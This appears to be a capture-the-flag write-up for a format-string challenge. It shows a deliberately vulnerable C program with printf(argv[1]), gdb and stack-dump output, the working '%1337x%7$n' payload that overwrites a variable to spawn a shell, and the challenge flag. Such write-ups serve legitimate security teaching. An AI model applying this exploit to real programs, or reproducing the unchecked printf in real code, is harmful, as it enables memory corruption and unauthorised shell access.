# Format - 70

```
This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found here.
```

Source code:

```
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}
```

printf(argv[1]); // this is where the format string bug.

Notes:
* We have to satisfy secret == 1337 to execute give_shell
* secret is global variable and initialize with 0
* We have to use this bug to set the secret to 1337

```
pico1139@shell:/home/format$ gdb -q format 
Reading symbols from format...(no debugging symbols found)...done.
(gdb) p &secret
$1 = (<data variable, no debug info> *) 0x804a030 <secret>
(gdb) q

pico15664@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.08x
ffffd764.ffffd770.f7e4f42d.f7fc73c4.f7ffd000.0804852b.0804a030.08048520.00000000 
                                                      --secret--

pico15664@shell:/home/format$ ./format $(python -c 'print "%1337x%7$n"')

//x%7 seventh value on stack 
//$n write to that spot 
//%1337 I am sure no explanation is needed for this.

$ ls
Makefile  flag.txt  format    format.c
$ cat flag.txt
who_thought_%n_was_a_good_idea? 
```

```
Flag: who_thought_%n_was_a_good_idea?
```
